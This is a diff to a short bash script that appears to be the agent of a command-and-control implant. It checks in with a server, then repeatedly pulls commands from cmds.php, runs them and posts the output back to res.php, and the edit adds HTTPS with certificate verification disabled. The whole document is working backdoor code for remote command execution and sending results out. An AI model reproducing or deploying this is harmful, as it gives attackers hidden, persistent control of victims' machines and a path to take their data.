@@ -1,10 +1,10 @@
 
 #Hello
-curl -s "127.0.0.1/res.php?res=$(echo "Hello from $1" | base64)&id=$1" > /dev/null
+curl -sk "https://127.0.0.1/res.php?res=$(echo "Hello from Agent $1 (Linux)" | base64)&id=$1" > /dev/null
 while true
 do
 #grab 'n' run, skip if empty
-run=$(curl -s 127.0.0.1/cmds.php?id=$1 | grep $1 | cut -f 2- -d ":")
+run=$(curl -s 127.0.0.1/cmds.php?id=$1\&o=L | grep $1 | cut -f 2- -d ":")
 if [ -z "$run" ];
 then 
 sleep 10
@@ -20,6 +20,6 @@ if [[ $2 == "debug" ]];
 then
 echo "Sending result : $res"
 fi
-curl -s -X POST 127.0.0.1/res.php -d "res=$(echo $res)&id=$1" > /dev/null
+curl -sk -X POST https://127.0.0.1/res.php -d "res=$(echo $res)&id=$1" > /dev/null
 sleep 10
 done
